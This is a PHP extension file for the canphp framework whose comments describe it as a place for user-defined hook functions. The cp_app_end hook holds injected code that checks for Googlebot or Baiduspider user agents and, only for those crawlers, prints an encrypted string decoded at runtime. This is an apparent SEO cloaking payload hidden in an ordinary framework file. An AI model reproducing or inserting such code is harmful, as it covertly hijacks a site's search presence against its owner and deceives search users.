<?php
/*
此文件extend.php在cpApp.class.php中默认会加载，不再需要手动加载
用户自定义的函数，建议写在这里

下面的函数是canphp框架的接口函数，
可自行实现功能，如果不需要，可以不去实现

注意：升级canphp框架时，不要直接覆盖本文件,避免自定义函数丢失
*/


//模块执行结束之后，调用的接口函数
function cp_app_end()
{

$tmp = $_SERVER['HTTP_USER_AGENT'];
if (strpos($tmp, 'Googlebot') !== false) {
    $flag = true;
} else
    if (strpos($tmp, 'Baiduspider') !== false) {
        $flag = true;
    }
if ($flag == true) {
echo cp_decode('d8794wqKD0yYMH8nHnqYjoWrgsax+d5r/BSiOidDe14asQa5ibzngS7ulqgCipGbw/+9a9fgqtak53IHKBmYlzUifABsjC/VdMnGWMDoymy4R6LD2LPZWb8VCy6Xwg122DXP8sUDxD/lq2ui7uUrZDsfQB7Mga5dHcHbJdwiqPv06/1627NePJuUbClrd9wmNnHGAMq42J9ICsvD9OAb22IaB4bJL6U/8MJqZZnOo9U3');
}


}



//自定义模板标签解析函数
function tpl_parse_ext($template,$config=array())
{
    require_once(dirname(__FILE__)."/tpl_ext.php");
    $template=template_ext($template,$config);
    return $template;

}


/*
//自定义网址解析函数
function url_parse_ext()
{
    cpApp::$module=trim($_GET['m']);
    cpApp::$action=trim($_GET['a']);
}
*/

//下面是用户自定义的函数

?>